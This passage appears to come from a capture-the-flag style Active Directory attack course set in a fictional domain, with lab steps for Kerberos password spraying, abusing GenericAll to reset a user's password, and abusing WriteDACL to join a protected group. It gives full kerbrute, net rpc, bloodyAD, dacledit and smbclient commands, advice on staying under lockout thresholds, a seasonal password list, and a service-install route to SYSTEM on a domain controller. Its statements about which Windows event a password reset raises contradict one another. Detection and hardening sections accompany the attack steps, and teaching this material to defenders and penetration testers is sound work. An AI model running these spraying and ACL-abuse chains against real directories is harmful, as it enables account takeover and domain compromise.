The configuration that would close this gap is the "Kerberos lockout" feature added in some EDR products or via custom Group Policy that wires the Kerberos pre-auth failure count into the lockout decision. By default it is not wired. Microsoft's official guidance increasingly suggests enabling additional Kerberos-based lockout, but penetration testers in 2026 still hit environments where kerbrute spraying is non-locking.

2. Spraying succeeds because of seasonal patterns. From a defender's perspective, what is the most effective single mitigation, and why is rotating password complexity not it?

Reveal Answer

The most effective single mitigation is multi-factor authentication on every external authentication surface, including VPN, web SSO, and any AD federation. With MFA, a sprayed password no longer yields immediate access; the attacker has the password but still needs a second factor. Internal AD spraying gets harder to weaponize because internal services that consume credentials (RDP, SMB, internal web apps) are increasingly behind smart-card, FIDO2, or Windows Hello. Rotating password complexity (forcing more characters, more classes) is not it because users respond to complexity rules by appending # and incrementing year numbers; the patterns just change shape and remain sprayable. Microsoft's password policy guidance has moved away from forced periodic rotation precisely because the resulting patterns are predictable.

3. The exercise uses a single seasonal password. In a real engagement an attacker would try ~10. What is the operational protocol for spraying multiple passwords without crossing the lockout threshold per account?

Reveal Answer

The protocol: spray one password against the full list, wait for the lockout observation window plus a margin (15 minutes + 5 = 20 minutes), spray the next password, wait again, repeat. With 10 candidate passwords this takes 200 minutes. Operators script the cadence to run overnight. Keep a count per account: never let a single account see more than 3 failures within any 15-minute rolling window across all your sprays, accounting for the user's own potential mistypes. Production tools like Spray.sh and MSOLSpray automate the cadence and per-account tracking. The risk is impatience: spraying two passwords back-to-back and finding nothing tempts an operator to spray a third immediately, which then crosses the threshold.

docs.title: Key Takeaways
docs.text:
• Spraying one password against many users avoids per-account lockout in default AD policy.
  • kerbrute passwordspray uses AS-REQs that do not increment badPwdCount.
  • Seasonal patterns (Summer2026#, Nordport2026#) hit on most engagements.
  • Stay under 3 attempts per account per 15-minute window to leave headroom for the user.
  • Defender mitigation: MFA on every authentication surface, not more complex passwords.

docs.title: Cheat Sheet Recap
docs.text:
The four operations below are the entire spray loop. Stick to kerbrute for AD; reach for netexec only when you accept lockout.

Goal Command Pull user list ldapsearch -x -LLL -H ldap://<dc> -D "<DOMAIN>\<u>" -w '<pw>' -b "<DN>" "(&(objectCategory=person)(objectClass=user))" sAMAccountName \| awk '/sAMAccountName: /{print $2}' > users.txt Validate names exist kerbrute userenum --dc <dc> -d <domain> users.txt Spray (Kerberos, lockout-safe) kerbrute passwordspray --dc <dc> -d <domain> users.txt '<pw>' -o hits.txt Cloud-side spray MSOLSpray.ps1 -UserList users.txt -Password '<pw>'

docs.title: Spaced Repetition
docs.text:
Card 1: kerbrute Spray Command

Q: Write the kerbrute command to spray Summer2026# against users.txt on corp.local at DC 10.10.10.10, writing results to out.txt.

Answer 
kerbrute passwordspray --dc 10.10.10.10 -d corp.local \
  users.txt 'Summer2026#' -o out.txt

Hits show as [+] VALID LOGIN: user@corp.local:Summer2026#. Add -v for verbose output.

Card 2: Why kerbrute Does Not Lock

Q: Why does kerbrute passwordspray usually not trigger AD account lockouts?

Answer

AD lockout reads badPwdCount, which is incremented by NTLM authentication failures (SMB, LDAP simple bind, RDP). Kerberos pre-auth failures use a separate KDC counter that the default lockout policy does not consult. So spraying via Kerberos AS-REQs does not increment badPwdCount and therefore does not trigger lockout. The exemption breaks if the environment has explicitly enabled Kerberos-based lockout via custom GPO or EDR.

Card 3: Lockout Math

Q: With a 5-attempt / 15-minute lockout policy, how many passwords can an operator spray per account per 15-minute window safely, and why?

Answer

Three. Five attempts in 15 minutes triggers lockout; if the operator uses 5, the legitimate user's next mistype causes a lockout that fires event 4740 and alerts the SOC. Three attempts per account per 15-minute window leaves two attempts of headroom for legitimate user typos. The cadence: spray one password against all users, wait 20 minutes (15 + 5 buffer), spray the next, repeat. Ten candidate passwords becomes a 200-minute job.

Card 4: Seasonal Pattern Wordlist

Q: List 6 password candidates that hit reliably on internal sprays in 2026.

Answer

Summer2026#, Spring2026#, Fall2026#, Winter2026!, <CompanyName>2026#, Welcome2026#. Honorable mentions: Password123!, <LocalSportsTeam>2026!, <Month>2026# for the current month. Curated seasonal lists of 8 to 12 entries beat 100K-line wordlists for spraying because each spray-pass costs time-per-account and you only get a few passes before lockout windows close.

Card 5: Production Tool Comparison

Q: For each of kerbrute, netexec (SMB protocol), and MSOLSpray, name the protocol used and whether it increments AD lockouts.

Answer

kerbrute passwordspray: Kerberos AS-REQ, does NOT increment badPwdCount in default policy. netexec smb: SMB / NTLM, increments badPwdCount on every failure. MSOLSpray: HTTPS to Microsoft Online (M365 / Azure AD), uses Azure AD authentication backend; lockout depends on Azure AD smart lockout policy (10 attempts, then 1-minute lockout escalating). Choose by target: kerbrute for AD, MSOLSpray for cloud, netexec only when you accept the lockout risk.

docs.title: Before You Begin
docs.text:
GenericAll is the ACL equivalent of full ownership. Whoever has it on a user object can read, write, set passwords, set the SPN, set userAccountControl, change membership, and effectively do anything to that user. The most direct exploitation is the password reset: change the target's password to something you control, then authenticate as the target. Exercise 4.1 asks you to walk that exact path against t.morrison_<token>.

Tools required: bloodhound-python, bloodyAD, net rpc, ldapsearch, netexec.

docs.title: Scenario
docs.text:
Marcus Bell: "BloodHound says IT_HelpDesk has GenericAll on a Server Operators member named t.morrison_<token>. That is a password-reset waiting to happen. Reset it, authenticate, read the user's extensionAttribute2."

j.chen is a member of IT_HelpDesk. The target's extensionAttribute2 holds your flag.

Credentials:

Username Password j.chen Welcome2026#

Domain: corp.nordport.local

docs.title: Your Objectives
docs.text:
• Confirm via BloodHound that IT_HelpDesk has GenericAll on t.morrison_<token>
  • Reset the target's password
  • Authenticate as the target
  • Read extensionAttribute2 over LDAP
  • Submit the flag

docs.title: The Path In Pictures
docs.text:
Each arrow is a single command (or a passive group membership check). The diagram below traces the full chain you will execute.

flowchart LR
    JC["User: j.chen"]
    HD["Group: IT_HelpDesk"]
    TM1["User: t.morrison_<token><br/>(unknown password)"]
    TM2["User: t.morrison_<token><br/>(controlled password)"]
    SO["Group: Server Operators<br/>(target inherits)"]

    JC -->|MemberOf| HD
    HD -->|GenericAll| TM1
    TM1 -->|net rpc password| TM2
    TM2 -->|MemberOf| SO

docs.title: How GenericAll Compares to Adjacent Rights
docs.text:
Several edges yield similar outcomes. The table below ranks them so you know which is fastest to exercise when BloodHound surfaces more than one option.

Right Steps to compromise Best command ForceChangePassword 1 (just reset) net rpc password GenericAll 1 (reset, OR set SPN, OR set UAC) net rpc password or bloodyAD set password GenericWrite 1 (set SPN, kerberoast) or 1 (set UAC, ASREPRoast) targetedKerberoast.py WriteDACL 2 (add ACE, exercise) dacledit.py write then net rpc password WriteOwner 3 (own, GenericAll ACE, exercise) bloodyAD set owner chain

docs.title: Background: GenericAll, the Right You Almost Always Want
docs.text:
AD ACLs are a long list of named rights. The most consequential ones for offense, in order of how directly they yield compromise:

Right What it does Most direct exploit GenericAll Full control on the object Reset password, set SPN, set UAC, anything WriteOwner Take ownership Take ownership, grant yourself GenericAll, exercise it WriteDACL Modify the object's ACL Add an ACE granting yourself GenericAll, exercise it ForceChangePassword Reset password without knowing old Direct reset GenericWrite Write any property Set SPN (Kerberoast-able), set msDS-AllowedToDelegateTo (constrained delegation abuse) WriteProperty (specific) Write a specific attribute Depends on which attribute (e.g., msDS-AllowedToActOnBehalfOfOtherIdentity = RBCD)

GenericAll collapses everything else into one ACE. If BloodHound shows it, you have the cleanest possible path.

docs.title: How GenericAll arises in production
docs.text:
• Helpdesk delegation gone wide: an admin granted "Help Desk Operators" GenericAll on a whole OU instead of Reset Password.
  • Stale group memberships: an old DA was demoted to a Tier-1 group that historically had GenericAll on Tier-0 users.
  • Service account provisioning errors: a script that auto-provisions users grants GenericAll to its own service account on every user it creates.
  • Sloppy ACL after a project: someone needed write on description for a script in 2018, granted GenericAll for expediency, never reverted.

The defender control is regular ACL audits with dsacls.exe, BloodHound run against the defender's own domain, or PingCastle. Most environments have at least one GenericAll path; finding all of them quickly is the offense's edge.

docs.title: The exploitation: net rpc password
docs.text:
net rpc password "t.morrison_<token>" "NewPassword2026#" \
  -U "CORP\j.chen%Welcome2026#" -S corp-dc01

The Samba net command speaks SAMR over RPC. The KDC sees the operation as j.chen setting t.morrison_<token>'s password, which is allowed by the GenericAll ACE. No event 4724 (privileged password reset) is generated; it is event 4723 (user account password change) on the target user.

docs.title: The exploitation: bloodyAD
docs.text:
bloodyAD -d corp.nordport.local -u j.chen -p 'Welcome2026#' --host corp-dc01 \
  set password "t.morrison_<token>" "NewPassword2026#"

Linux-native, no Samba dependency. Identical effect.

docs.title: Confirm GenericAll via BloodHound
docs.text:
Cypher (canonical BHCE form, paste as one line):

MATCH (g:Group)-[:GenericAll]->(u:User) WHERE g.name = 'IT_HELPDESK@CORP.NORDPORT.LOCAL' RETURN u

Returns User nodes; the graph view renders them. To see usernames in a list, switch the result panel to Table view and replace RETURN u with RETURN u.name. Or in the UI, select the IT_HelpDesk node and look at "Outbound Object Control" -> GenericAll.

docs.title: Reset password
docs.text: net rpc password "<target>" "<newpass>" -U "DOM\<src>%<srcpass>" -S <dc>

docs.title: Read extensionAttribute over LDAP
docs.text:
ldapsearch -x -LLL -H ldap://<dc> \
  -D "CORP\<resetuser>" -w '<newpass>' \
  -b "DC=corp,DC=nordport,DC=local" \
  "(sAMAccountName=<resetuser>)" extensionAttribute2

docs.title: Step 1: Confirm the Path with BloodHound
docs.text:
Always confirm the path before exercising it. A graph that is hours stale can show edges that were just remediated. The Cypher below asks for the shortest path from your foothold to the target, capped at 6 hops to keep the search tractable.

Collect the domain first (bloodhound-python -u j.chen -p 'Welcome2026#' -d corp.nordport.local -ns corp-dc01 -c All --zip), ingest into BloodHound CE, then run:

MATCH p=shortestPath((n:User)-[*1..]->(m:User)) WHERE n.name = 'J.CHEN@CORP.NORDPORT.LOCAL' AND m.name = 'T.MORRISON_<TOKEN>@CORP.NORDPORT.LOCAL' RETURN p

Canonical BHCE form: single MATCH, single WHERE with AND. Substitute your literal token (uppercase, e.g. T.MORRISON_J001) into the WHERE string.

You should see J.CHEN -MemberOf-> IT_HELPDESK -GenericAll-> T.MORRISON_<TOKEN>. Names are stored UPPERCASE in BloodHound CE; substitute your literal token (for example T.MORRISON_J001) into the query.

docs.title:
Step 2: Reset t.morrison_'s Password

The net rpc password command opens a SAMR handle as j.chen and calls SamrSetInformationUser with the new password. The DC checks j.chen's effective rights on the target object; the GenericAll ACE permits the operation. Pick a strong throwaway value; you will not need it after Step 4.

Kali - Reset password via SAMR over RPC

net rpc password "t.morrison_${OCR_SCOPE_TOKEN}" "TempReset2026#" \
  -U "CORP\j.chen%Welcome2026#" -S corp-dc01
Token Effect net rpc password Samba's SAMR password-set wrapper. "<target>" First positional: account whose password to set. "<newpass>" Second positional: new password value. -U "DOM\user%pass" Authenticate as this principal. -S <dc> Talk to this server.

Expected output: Password was changed. Equivalent Linux-native (no Samba dependency):

bloodyAD -d corp.nordport.local -u j.chen -p 'Welcome2026#' --host corp-dc01 \
  set password "t.morrison_${OCR_SCOPE_TOKEN}" 'TempReset2026#'

Step 3: Authenticate as the Target

Confirm the reset took before doing anything else with the credential. A failed reset (silent permission denial) would show up here with STATUS_LOGON_FAILURE and save you a lot of confused troubleshooting.

Kali - Validate the new credential

netexec smb corp-dc01 -u "t.morrison_${OCR_SCOPE_TOKEN}" \
  -p 'TempReset2026#' -d corp.nordport.local

[+] confirms. [-] with STATUS_PASSWORD_MUST_CHANGE means the DC accepted your credential but flagged it for change-on-next-logon (some lockout policies enforce this); bloodyAD change-password after a normal connection clears it.

Step 4: Read the Target's extensionAttribute2

With the reset credential you can now bind as the target user and read attributes that only the target itself can see (or that you happen to want to read with their identity). The trailing extensionAttribute2 requests only that single attribute.

Kali - Pull the flag from extensionAttribute2

ldapsearch -x -LLL -H ldap://corp-dc01 \
  -D "CORP\t.morrison_${OCR_SCOPE_TOKEN}" -w 'TempReset2026#' \
  -b "DC=corp,DC=nordport,DC=local" \
  "(sAMAccountName=t.morrison_${OCR_SCOPE_TOKEN})" extensionAttribute2
Token Effect -D "CORP\t.morrison_..." Bind DN: authenticate as the reset user. -w 'TempReset2026#' The new password from Step 2. (sAMAccountName=...) Filter to a single object. extensionAttribute2 Trailing attribute list; only this attribute returned.

The attribute value is the flag.

Step 5: Submit and Note the Operational Hygiene

In a real engagement you would now leave a note that the target's password was reset, rotate it back to a randomized strong value when done, and document the new password rotation in your engagement report. For this exercise, just submit the flag.

Common gotchas

  • Group membership cache: j.chen must already be a member of IT_HelpDesk for the GenericAll grant to apply. If you were just added to the group, log out and re-authenticate; Kerberos caches group SIDs in the TGT for 10 hours by default.
  • DACL inheritance disabled: if t.morrison's user object has DACL inheritance disabled, the OU-wide GenericAll grant may not apply to that one user. BloodHound shows the path, but the actual reset returns STATUS_ACCESS_DENIED. Verify with dacledit.py read.
  • SAMR vs LDAP password set: net rpc password uses SAMR (event 4724). LDAP-based password set via unicodePwd modify uses event 4723. Detection rules sometimes alert on one but not the other.
  • Production reset: never reset a password on a real engagement without coordinating with the customer. The user's next login attempt fails, support tickets get filed, and your stealth budget evaporates.
Blue Team Perspective
docs.text:
A password reset by another user is one of the highest-signal events in the Windows security log. Defenders that allow-list legitimate resetters catch this finding fast.

Activity Event ID Where it fires Account password reset by another user 4724 DC Security log Object DACL change 5136 DC Security log MDI suspicious password reset "Suspicious modification of a sensitive group" Defender for Identity Lateral auth as reset user 4624 logon type 3 from new IP Target server log

Where this attack gets caught

The single best detection is on event 4724 with an allow-list of legitimate password-reset principals (typically a small set of helpdesk service accounts). Any 4724 issued by a principal not on the allow-list is a high-confidence finding. Microsoft Defender for Identity also fires "Suspicious modification of a sensitive group" if the reset target is a member of any privileged group, which catches the Server Operators chain in this exercise.

docs.title: Hardening Note
docs.text:
ACL hygiene is the work. Most environments have at least one orphaned GenericAll grant from a 2015 ticket that was never reverted.

Practical ACL hardening

  • Run BloodHound against your own domain quarterly. Sort all GenericAll, WriteOwner, WriteDACL, GenericWrite, ForceChangePassword edges by target sensitivity.
  • Replace blanket helpdesk delegations (GenericAll on whole OUs) with delegated control wizards that grant only Reset Password on a tightly scoped OU.
  • Build a SIEM detection on event 4724 with allow-list of approved resetter principals.
  • Periodically diff BloodHound collections to catch newly added ACEs.
  • Move privileged group members (Server Operators, Backup Operators) to a Tier-0 OU with deny-Authenticated-Users-write ACLs.

docs.title:
Record Your Findings

Path confirmed:

j.chen --MemberOf--> IT_HelpDesk --GenericAll--> t.morrison_<token>

Reset password to:

TempReset2026#  (or your chosen value)

Flag (extensionAttribute2):

(OCR{ga_...})
Analysis Questions
docs.text:
1. The exercise resets the target user's password directly. In a real engagement, what hygiene does an operator follow to avoid breaking production access?

Reveal Answer

Hygiene rules: (1) Note the original password (or its hash if you can dump it via DCSync first). (2) Reset to a known-strong randomized value, never something predictable. (3) Document the reset in your engagement notes with a timestamp. (4) When the operation is done, rotate the password back to a randomized value the customer rotates again at engagement close. (5) If the target account is privileged or actively used by a running service, prefer alternative paths (kerberoast first, write SPN to the account and kerberoast, etc.) that do not break the running service. The customer-facing red flag is "we reset Joe's password and Joe could not log in next morning"; experienced consultants either avoid the reset entirely or pre-coordinate it with the engagement contact.

2. GenericAll on a user gives you everything. Why might an attacker prefer GenericWrite to GenericAll, when both are present?

Reveal Answer

Both grant write capability, but GenericWrite is specifically writing properties without the right to read sensitive attributes (in some configurations) and without the right to delete the object. Some defenders monitor GenericAll more aggressively than GenericWrite. An attacker with GenericWrite can still set the SPN (turning the account Kerberoastable), set msDS-AllowedToDelegateTo (constrained delegation abuse), or write userAccountControl to disable pre-auth (turning the account ASREPRoastable). The end-state compromise is the same; the audit trail is quieter. In practice, BloodHound shows both as similarly powerful and most operators exercise whichever is most convenient.

3. The Server Operators membership on t.morrison_<token> is incidental scenery in this exercise. In a real engagement, why would adding the target to Server Operators (or finding them already in it) make this finding more valuable?

Reveal Answer

Server Operators membership is essentially Domain Admin equivalence on Domain Controllers via the "install a service that runs as LOCAL SYSTEM on a DC" technique (covered in exercise 2.4). So a chain that compromises t.morrison_ via GenericAll AND finds them in Server Operators yields a chain that ends in DC SYSTEM. In a report you would represent the chain as j.chen -> IT_HelpDesk -> GenericAll -> t.morrison -> Server Operators -> DC SYSTEM and rate it Critical. The Server Operators membership is what turns "we got a user account" into "we got the domain." Always trace your reset target's group memberships forward to see how high the chain reaches.

docs.title: Key Takeaways
docs.text:
• GenericAll collapses all ACL rights into one ACE; the most direct exploit is password reset.
  • net rpc password and bloodyAD set password both perform the SAMR-level reset.
  • BloodHound's "Outbound Object Control" view enumerates everything a node can change.
  • Operational hygiene: record the original, choose a strong reset value, rotate back at end of engagement.
  • The chain's value depends on the target's group memberships; trace forward to find the maximum impact.

docs.title: Cheat Sheet Recap
docs.text:
The four operations below cover GenericAll exploitation end to end. Use them in this order on any GenericAll edge.

Goal Command Confirm GenericAll path Cypher: MATCH (g:Group)-[:GenericAll]->(u:User) WHERE g.name = '<G>@<DOM>' RETURN u Reset password (Samba) net rpc password "<target>" "<newpw>" -U "<DOM>\<atk>%<pw>" -S <dc> Reset password (Linux-native) bloodyAD -d <domain> -u <atk> -p '<pw>' --host <dc> set password "<target>" '<newpw>' Validate as target netexec smb <dc> -u <target> -p '<newpw>' -d <domain>

docs.title: Spaced Repetition
docs.text:
Card 1: net rpc password Syntax

Q: Write the net rpc command to reset targetuser's password to NewPwd# using srcuser / SrcPwd# against DC dc01.

Answer 
net rpc password "targetuser" "NewPwd#" -U "DOM\srcuser%SrcPwd#" -S dc01

Outputs Password was changed. on success. The operation is event 4723 (user changes own password) from the DC's perspective because the SAMR handle is opened with the source user's credentials.

Card 2: bloodyAD Equivalent

Q: Linux-native equivalent of the above using bloodyAD.

Answer 
bloodyAD -d corp.local -u srcuser -p 'SrcPwd#' --host dc01 \
  set password "targetuser" 'NewPwd#'

bloodyAD performs the same SAMR call without needing Samba's net binary. Useful when running from container shells without Samba installed.

Card 3: GenericAll vs GenericWrite

Q: Both grant write capability. What does GenericAll add that GenericWrite does not?

Answer

GenericAll grants delete and read-control rights on the object in addition to write; GenericWrite is "write properties only." Some sensitive attribute reads also require the read-control component, though most are readable by Authenticated Users by default. For practical attack purposes, both let you set SPN, set UAC, and reset password (the latter via SAMR which uses a different access mask than the directory write); the difference is that GenericAll lets you also delete the object and modify its ACL. Defender monitoring sometimes treats GenericAll more aggressively, so an attacker with both available will often exercise GenericWrite instead.

Card 4: BloodHound Cypher for IT_HelpDesk Reach

Q: Write a Cypher query that returns every user IT_HelpDesk has GenericAll on in corp.local.

Answer 
MATCH (g:Group)-[:GenericAll]->(u:User) WHERE g.name = 'IT_HELPDESK@CORP.LOCAL' RETURN u

Names are UPPERCASE in the graph. To include WriteOwner / WriteDACL paths in one query, use [:GenericAll|WriteOwner|WriteDACL]. To include nested groups (any GenericAll inherited via group nesting): MATCH p=(g:Group)-[:MemberOf*0..]->()-[:GenericAll]->(u:User) WHERE g.name = 'IT_HELPDESK@CORP.LOCAL' RETURN p.

Card 5: Server Operators Equivalence

Q: A user with no Domain Admin membership is in Server Operators. Why is that effectively DA on the DC?

Answer

Server Operators can install Windows services on Domain Controllers. A service can be configured to run as LOCAL SYSTEM and execute any payload the operator chooses (sc.exe create EvilSvc binPath= "C:\path\to\payload.exe" type= own start= demand then sc.exe start EvilSvc). The payload runs as NT AUTHORITY\SYSTEM on the DC, which has secretsdump-equivalent rights, can write to LSASS, and can perform any Tier-0 action. So Server Operators on a DC = effective DA. Defenders should empty Server Operators or restrict it to genuinely necessary, monitored accounts.

docs.title: Before You Begin
docs.text:
WriteDACL is the right to modify an object's access control list. The attacker exercises it by adding an ACE that grants them further rights (typically GenericAll), then exercising those further rights. On a group, the practical exploitation is: add an ACE granting yourself the right to write the member attribute, then add yourself to the group. Now you inherit whatever the group grants.

Exercise 4.2 targets a per-token Backup_Operators_<token> group on which IT_HelpDesk has WriteDACL. Add yourself; read the per-token flag file accessible only to group members.

Tools required: bloodyAD, net rpc, smbclient, bloodhound-python. Pre-installed on Kali.

docs.title: Scenario
docs.text:
Marcus Bell: "GenericAll is the loud version. WriteDACL is the surgical version. You write your own ACE and clean up after. IT_HelpDesk has WriteDACL on a token-scoped Backup_Operators group. Add yourself, read the protected file, then remove your ACE before you leave so the audit trail is minimal."

Credentials:

Username Password j.chen Welcome2026#

Domain: corp.nordport.local

docs.title: Your Objectives
docs.text:
• Confirm IT_HelpDesk -WriteDACL-> Backup_Operators_<token> in BloodHound
  • Add a GenericAll ACE for j.chen on the group
  • Add j.chen to the group
  • Read \\corp-dc01\BackupFlags\<token>\FLAG.txt
  • Remove your ACE (operational hygiene; not scored, but the right habit)

docs.title: Two-Step Escalation Visualised
docs.text:
WriteDACL is a two-step move: write the ACE, then exercise it. The diagram below mirrors the change you make on disk and the change in your effective rights.

flowchart TD
    Pre["Pre-attack ACL on Backup_Operators_<token>"]
    Pre --> P1["Domain Admins -- GenericAll"]
    Pre --> P2["IT_HelpDesk -- WriteDACL"]

    Add["bloodyAD add genericAll<br/>(your write of the ACL)"]

    Post["Post-attack ACL"]
    Post --> Q1["Domain Admins -- GenericAll"]
    Post --> Q2["IT_HelpDesk -- WriteDACL"]
    Post --> Q3["j.chen -- GenericAll<br/>(NEW)"]

    Pre --> Add --> Post
    Post --> Member["net rpc group addmem<br/>(j.chen now in group)"]
    Member --> Inherit["j.chen inherits group rights<br/>and reads BackupFlags"]

docs.title: TGT/PAC Refresh Sequence
docs.text:
Group rights live in the PAC of your TGT. Adding yourself does nothing until you obtain a fresh ticket. The diagram below traces what changes when.

sequenceDiagram
    autonumber
    participant C as Attacker (j.chen)
    participant K as KDC
    participant FS as Server (BackupFlags share)

    C->>K: AS-REQ (initial kinit)
    K-->>C: TGT with PAC = {IT_HelpDesk}
    C->>K: WriteDACL: add GenericAll ACE
    C->>K: AddMember: add j.chen to Backup_Operators_<token>
    C->>FS: SMB connect with old TGT
    FS-->>C: ACCESS_DENIED (PAC missing new group)
    C->>K: kdestroy + kinit (fresh AS-REQ)
    K-->>C: NEW TGT with PAC = {IT_HelpDesk, Backup_Operators_<token>}
    C->>FS: SMB connect with new TGT
    FS-->>C: read FLAG.txt OK

docs.title: Background: WriteDACL vs WriteOwner
docs.text:
Both WriteDACL and WriteOwner let you escalate rights on the target. The difference:

Right Mechanism Cleanup difficulty WriteDACL Add an ACE to the existing ACL Easy: remove the added ACE WriteOwner Take ownership, then write the ACL Medium: restore the original owner

WriteDACL is preferred when both are available because the ownership change is a high-fidelity audit trail (event 4670, "permissions on an object were changed", with the original owner field changing). A surgical ACE addition is also event 4670, but the "object owner" field is unchanged so a sloppy SOC may not notice.

docs.title: What ACE to add
docs.text:
You want GenericAll on the group. Reasoning: - GenericAll includes write-property (so you can write the member attribute) - GenericAll includes the right to read all attributes (handy if you need to enumerate group state) - GenericAll is one ACE, simpler to clean up than three more-specific ones

Alternative: add only WriteProperty on the member attribute (more surgical):

bloodyAD ... add ace Backup_Operators_<token> j.chen --right WriteProperty --object-type member

For class purposes, GenericAll is fine.

docs.title: Microsoft's behavior on group memberships
docs.text: When you write the member attribute on a group, the changes propagate immediately to the local DC and replicate to peer DCs at the next replication cycle (typically 15 minutes intra-site, 180 minutes inter-site). Your effective permissions update instantly on the local DC; you may need to wait for replication if you are authenticating against a different DC. In Nordport's single-DC setup this is not a concern.

docs.title: bloodyAD ACE manipulation
docs.text:
Add a GenericAll ACE for j.chen on the group:

bloodyAD -d corp.nordport.local -u j.chen -p 'Welcome2026#' --host corp-dc01 \
  add genericAll "Backup_Operators_<token>" j.chen

Remove that ACE later (cleanup):

bloodyAD -d corp.nordport.local -u j.chen -p 'Welcome2026#' --host corp-dc01 \
  remove genericAll "Backup_Operators_<token>" j.chen

docs.title: dacledit.py (impacket)
docs.text:
Linux equivalent for ACL writes:

dacledit.py -action write -rights FullControl \
  -principal j.chen \
  -target-dn "CN=Backup_Operators_<token>,OU=IT,DC=corp,DC=nordport,DC=local" \
  -dc-ip corp-dc01 corp.nordport.local/j.chen:'Welcome2026#'

docs.title: Group membership writes via net rpc
docs.text:
net rpc group addmem "Backup_Operators_<token>" "j.chen" \
  -U "CORP\j.chen%Welcome2026#" -S corp-dc01

net rpc group delmem "Backup_Operators_<token>" "j.chen" \
  -U "CORP\j.chen%Welcome2026#" -S corp-dc01

docs.title: Confirm via BloodHound
docs.text:
Canonical BHCE form (paste as one line; substitute your uppercase token):

MATCH (g:Group)-[:WriteDACL]->(t:Group) WHERE g.name = 'IT_HELPDESK@CORP.NORDPORT.LOCAL' AND t.name CONTAINS '<TOKEN>' RETURN t

docs.title: Step 1: Confirm the WriteDACL Edge
docs.text:
Always confirm before exercising. WriteDACL is a quiet permission that is easy to miss when the graph is busy. In BloodHound CE search for IT_HelpDesk, then click "Outbound Object Control" in the left panel. The "WriteDACL" row lists every object IT_HelpDesk can rewrite the ACL for. The per-token Backup_Operators_<token> group should be there.

Cypher equivalent (paste as one line; substitute your uppercase token like J001):

MATCH (g:Group)-[:WriteDACL]->(t:Group) WHERE g.name = 'IT_HELPDESK@CORP.NORDPORT.LOCAL' AND t.name CONTAINS '<UPPER_TOKEN>' RETURN t

docs.title: Step 2: Add a GenericAll ACE for j.chen
docs.text:
bloodyAD add genericAll <object> <principal> writes one new ACE into the object's DACL. The DC checks j.chen's effective rights on the target; the WriteDACL ACE inherited from IT_HelpDesk membership permits the modification. The new ACE grants j.chen full control over the object going forward.

Kali - Grant yourself GenericAll on the group via bloodyAD

bloodyAD -d corp.nordport.local -u j.chen -p 'Welcome2026#' --host corp-dc01 \
  add genericAll "Backup_Operators_${OCR_SCOPE_TOKEN}" j.chen
Token Effect add genericAll <obj> <principal> Append a GENERIC_ALL ACE for <principal> to <obj>'s DACL. --host <dc> Target DC. bloodyAD speaks LDAP/RPC to this server. <obj> Target object name (sAMAccountName for users/groups, CN for computers).

Verify the ACE landed:

bloodyAD -d corp.nordport.local -u j.chen -p 'Welcome2026#' --host corp-dc01 \
  get object "Backup_Operators_${OCR_SCOPE_TOKEN}" --attr nTSecurityDescriptor

A new ACE for j.chen granting GENERIC_ALL should appear in the SDDL output.

docs.title: Step 3: Add j.chen to the Group
docs.text:
With GenericAll in place you can write the member attribute. net rpc group addmem is the SAMR way; bloodyAD's add groupMember is the LDAP way. Both produce the same domain state.

Kali - net rpc group addmem

net rpc group addmem "Backup_Operators_${OCR_SCOPE_TOKEN}" "j.chen" \
  -U "CORP\j.chen%Welcome2026#" -S corp-dc01
Token Effect group addmem Subcommand: add member to group. "<group>" First positional. "<user>" Second positional. -U "DOM\u%pw" Authenticate as this principal. -S <dc> Target server.

Or via bloodyAD (idempotent; safe to re-run):

bloodyAD -d corp.nordport.local -u j.chen -p 'Welcome2026#' --host corp-dc01 \
  add groupMember "Backup_Operators_${OCR_SCOPE_TOKEN}" j.chen

docs.title: Step 4: Get a Fresh Kerberos Ticket
docs.text:
Group memberships are baked into the PAC inside your TGT at the moment of issuance. The TGT you already hold lists your previous groups; the KDC will not silently rewrite it. To exercise the new membership you must request a new TGT, which means a fresh AS-REQ.

Kali - Re-authenticate to refresh group membership

kdestroy
echo 'Welcome2026#' | kinit j.chen@CORP.NORDPORT.LOCAL
Token Effect kdestroy Delete the existing credential cache. kinit <user>@<REALM> Request a new TGT. The realm must be uppercase. echo '<pw>' \| Pipe the password to skip the interactive prompt.

Alternatively, the next SMB connection initiated by netexec or smbclient triggers a fresh authentication and receives a PAC with the new group automatically.

docs.title: Step 5: Read the Per-Token Flag
docs.text:
The flag file lives in \\corp-dc01\BackupFlags\<token>\FLAG.txt. The DACL on that directory grants Backup_Operators_<token> the read right; with your fresh PAC, j.chen now inherits that right.

Kali - Pull FLAG.txt from your token directory

smbclient //corp-dc01/BackupFlags \
  -U "CORP\j.chen%Welcome2026#" \
  -c "cd ${OCR_SCOPE_TOKEN}; get FLAG.txt"
cat FLAG.txt

Submit the OCR{...} value.

docs.title: Step 6: Cleanup (Operational Hygiene)
docs.text:
Order matters. Remove yourself from the group first; you still have GenericAll via the ACE, which lets you make that change. Then remove the ACE. If you do these in reverse you remove the ACE before removing the membership, and you no longer have the right to clean up your own membership.

Kali - Remove your ACE and group membership in correct order

net rpc group delmem "Backup_Operators_${OCR_SCOPE_TOKEN}" "j.chen" \
  -U "CORP\j.chen%Welcome2026#" -S corp-dc01

bloodyAD -d corp.nordport.local -u j.chen -p 'Welcome2026#' --host corp-dc01 \
  remove genericAll "Backup_Operators_${OCR_SCOPE_TOKEN}" j.chen

The cleanup is not scored. The habit is the point.

Common gotchas

  • Cleanup order: removing the ACE before removing the membership leaves you stuck (no rights to remove yourself). Always remove membership first.
  • PAC stale: if smbclient returns NT_STATUS_ACCESS_DENIED after step 3, you skipped step 4. The fresh ticket is required.
  • Group nesting: in some configurations Backup_Operators_ is a member of Backup_Operators (the built-in). Your membership in the per-token group inherits transitively, but only after the ticket refresh.
  • bloodyAD permission cache: bloodyAD opens an LDAP bind once and reuses it. Run as a single command; running multiple bloodyAD invocations in quick succession works because each makes its own bind, but the per-bind permissions are evaluated fresh on the server.

docs.title: Blue Team Perspective
docs.text:
The relevant signals fire on every WriteDACL chain; the noise around them is what makes detection hard. Defenders that diff DACLs against a baseline catch this attack reliably.

Activity Event ID Where it fires DACL change on object 4670, 5136 DC Security log Group membership added 4728 / 4732 / 4756 DC Security log Auth as new group member 4624 logon type 3 Target server log MDI privileged-group change "Suspicious modification of a sensitive group" Defender for Identity

Where the SOC catches WriteDACL

Event 4670 fires thousands of times per day in normal operation, so raw volume is unusable. The detection that works is DACL diffing: take a snapshot of the SDDL on every Tier-0 and operator group weekly; alert on any new ACE granting GenericAll, WriteDACL, WriteOwner, or GenericWrite to a non-Tier-0 principal. Group-membership change events 4728/4732/4756 are also high-signal when paired with allow-listing of approved enrollers.

docs.title: Hardening Note
